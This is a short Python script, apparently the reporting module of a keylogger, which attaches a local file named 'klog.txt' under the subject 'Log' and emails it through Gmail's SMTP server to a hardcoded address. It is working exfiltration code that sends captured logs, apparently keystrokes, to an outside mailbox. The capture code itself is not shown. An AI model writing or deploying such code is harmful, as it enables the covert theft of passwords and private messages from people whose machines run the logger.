#!/usr/bin/env python3

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

def send_log():
    sender = "lecheurcaca@gmail.com"
    receiver = sender
    pwd = os.environ.get('GMAIL_PASSWORD')
    if pwd is None:
        raise Exception("Variable not defined")

    smtp_server = "smtp.gmail.com"
    smtp_port = 587

    message = MIMEMultipart()
    message["From"] = sender
    message["To"] = receiver
    message["Subject"] = "Log"

    msg_body = "Report from logger:"
    message.attach(MIMEText(msg_body, "plain"))
    file_path = "klog.txt"
    file_name = "klog.txt"

    with open(file_path, "rb") as attachment:
        file = MIMEBase("application", "octet-stream")
        file.set_payload(attachment.read())
    
    encoders.encode_base64(file)
    file.add_header(
        "Content-Disposition",
        f"attachment; filename= {file_name}",
    )

    message.attach(file)

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender, pwd)
            server.send_message(message)
        print ("Sent mail!")
    except Exception as e:
        print ("Error sending mail: {e}")
